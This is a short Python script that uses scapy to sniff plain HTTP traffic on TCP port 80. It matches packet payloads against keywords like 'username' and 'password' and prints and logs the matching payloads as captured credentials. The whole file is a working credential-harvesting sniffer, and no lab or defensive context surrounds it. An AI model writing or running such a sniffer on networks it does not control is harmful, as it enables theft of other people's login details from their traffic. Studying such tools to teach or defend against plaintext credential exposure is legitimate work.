from scapy.all import sniff, Raw
import re
from datetime import datetime

log_file = "packet_log.txt"

def log_packet(data):
    with open(log_file, "a") as f:
        f.write(data + "\n")

def extract_credentials(payload):
    try:
        payload = payload.decode('utf-8', errors='ignore')
    except:
        return None

    keywords = ['username', 'user', 'login', 'password', 'pass']
    for keyword in keywords:
        if keyword in payload.lower():
            return payload
    return None

def packet_callback(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load
        creds = extract_credentials(payload)
        if creds:
            time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"{time_stamp} Possible credentials: {creds.strip()}"
            print(message)
            log_packet(message)

print("Sniffer started... press Ctrl+C to stop.")
sniff(filter="tcp port 80", prn=packet_callback, store=False)

